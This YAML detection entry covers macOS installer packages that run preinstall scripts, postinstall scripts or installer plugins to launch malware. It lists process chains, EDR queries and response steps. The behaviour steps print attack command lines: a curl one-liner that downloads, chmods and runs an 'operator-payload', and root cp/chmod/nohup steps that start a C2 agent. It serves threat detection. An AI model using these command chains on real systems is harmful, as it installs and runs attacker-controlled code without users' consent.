---
Name: Installers
Description: On macOS, malware is often distributed to users via macOS Installers. These are generally going to be extremely noisy in most environments. Most of these are only recommended for threat hunting, baselining or trigger some automated action to collect more information from the endpoint.
Author: 
Created: 2022-05-17
Full_Path:
  - Path: /System/Library/CoreServices/Installer.app/Contents/MacOS/Installer
  - Path: /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/XPCServices/package_script_service.xpc/Contents/MacOS/package_script_service
  - Path: /bin/bash
Resources:
  - Link: https://github.com/AutomoxSecurity/iShelly
Commands:

  - Name: macOS installer package with preinstall script
    Description: This query detects any instance of macOS installers running a preinstall script.
    Usecase: Adversaries may pair this technique with a social engineering component to execute malware.
    Category: Execution
    Privileges: Root
    MitreID: T1204.002
    Behaviors:
      - Step: When executing the pkg file generated via iShelly, launchd runs Installer as user.
      - Step: After the user clicks through Installer prompts and authenticates, launchd runs package_script_service as root.
      - Step: package_script_service runs bash (or whatever script interpreter is used in the installer) as root with a cmdline similar to <pre><code>/bin/bash /tmp/PKInstallSandbox.YxqP12/Scripts/com.simple.test.ir2Zsb/preinstall /Users/user/iShelly/Payloads/install_pkg.pkg / / / </code></pre>
      - Step: The bash process launches cp as root with the following cmdline <pre><code>cp files/operator-payload /Library/Application Support/ "</pre></code> chmod is also executed by the same bash process to make it executable using cmdline <pre><code>chmod +x /Library/Application Support/operator-payload </pre></code>
      - Step: the same bash process executes nohup -> bash as root with cmdline <pre><code>nohup bash -c /Library/Application\\ Support/operator-payload -name installer-w-preinstall-script</pre></code>
      - Step: operator-payload executes as root using cmdline <pre><code>/Library/Application Support/operator-payload -name installer-w-preinstall-script</pre></code> and makes a network connection to operator.
    Execute:
      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Installer Package w/ only preinstall script" Installer Package option. Then execute the pkg file, which will execute an Operator agent after clicking through Installer prompts.
    Detect:
      - EDR: parent_process_name = "package_script_service" and process_cmdline = "*preinstall*"
      - Notes: Alerting on this will be extremely noisy and is not recommended. If using for baselining, exclude based on the pkg name in process_cmdline, but beware an attacker can also leverage this by naming their package after a popular installer.
    Respond:
      - Step: Review the process_cmdline field of process package_script_service. This will contain the execution of the preinstall script and will have the name of the .pkg being executed.
      - Step: Review the children of process package_script_service (often this will be the bash process, but could be another script interpreter). These children will be the commands executed as a result of the preinstall script.
      - Step: Review process creations, network connections and file writes of all children processes of package_script_service.

  - Name: macOS installer package with postinstall script
    Description: This query detects any instance of macOS installers running a postinstall script.
    Usecase: Adversaries may pair this technique with a social engineering component to execute malware.
    Category: Execution
    Privileges: Root
    MitreID: T1204.002
    Behaviors:
      - Step: When executing the pkg file generated via <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a>, launchd runs Installer as user.
      - Step: After the user clicks through Installer prompts and authenticates, launchd runs package_script_service as root.
      - Step: package_script_service runs bash (or whatever script interpreter is used in the installer) as root with a cmdline similar to <pre><code>/bin/bash /tmp/PKInstallSandbox.YxqP12/Scripts/com.simple.test.ir2Zsb/postinstall /Users/user/iShelly/Payloads/install_pkg.pkg / / / </code></pre>
      - Step: The bash process launches cp as root with the following cmdline <pre><code>cp files/operator-payload /Library/Application Support/ "</pre></code> chmod is also executed by the same bash process to make it executable using cmdline <pre><code>chmod +x /Library/Application Support/operator-payload </pre></code>
      - Step: the same bash process executes nohup, which executes bash as root with cmdline <pre><code>nohup bash -c /Library/Application\\ Support/operator-payload -name installer-w-postinstall-script</pre></code>
      - Step: operator-payload executes as root using cmdline <pre><code>/Library/Application Support/operator-payload -name installer-w-postinstall-script</pre></code> and makes a network connection to operator.
    Execute:
      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Installer Package w/ only postinstall script" Installer Package option. Then execute the pkg file, which will execute an Operator agent after clicking through Installer prompts.
    Detect:
      - EDR: parent_process_name = "package_script_service" and process_cmdline = "*postinstall*"
      - Notes: Alerting on this will be extremely noisy and is not recommended. If using for baselining, exclude based on the pkg name in process_cmdline, but beware an attacker can also leverage this by naming their package after a popular installer.
    Respond:
      - Step: Review the process_cmdline field of process package_script_service. This will contain the execution of the postinstall script and will have the name of the .pkg being executed.
      - Step: Review the children of process package_script_service (often this will be the bash process, but could be another script interpreter). These children will be the commands executed as a result of the postinstall script.
      - Step: Review process creations, network connections and file writes of all children processes of package_script_service.

  - Name: macOS installer plugin
    Description: This query detects any instance of macOS installer plugins.
    Usecase: Adversaries may pair this technique with a social engineering component to execute malware. Adversaries may use this technique to generate less known EDR behavioral patterns or when they need malware running as user.
    Category: Execution
    Privileges: User
    MitreID: T1204.002
    Behaviors:
      - Step: When executing the pkg file generated via <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a>, launchd runs Installer as user.
      - Step: Installer prompts the user with subject "This package will run a program to determine if the software can be installed".
      - Step: xpcproxy magic happens, and launchd executes InstallerRemotePluginService-x86_64 as user.
      - Step: InstallerRemotePluginService-x86_64 then launches the script interpreter as a user. In our case this will be bash (since this is how iShelly implements this vector). The cmdline is <pre><code>/bin/bash -c /usr/bin/curl -k 'http://127.0.0.1:3391/payloads/d2526ae26fc2139263f57c2af445004e385772ec/operator-payload' -o /Users/$USER/Library/Application\\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\\ Support/operator-payload; /Users/$USER/Library/Application\\ Support/operator-payload -name installer-plugin & </pre></code>
      - Step: as a result of the above bash one liner, bash executes the following children processes- curl, chmod, operator-payload.
      - Step: operator-payload makes a network connection to operator.
    Execute:
      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Installer Package w/ Installer Plugin" Installer Package option.
    Detect:
      - EDR: process_name = "InstallerRemotePluginService-x86_64"
    Respond:
      - Step: Review the children of process InstallerRemotePluginService.
      - Step: Review process creations, network connections and file writes of all children processes of InstallerRemotePluginService.
---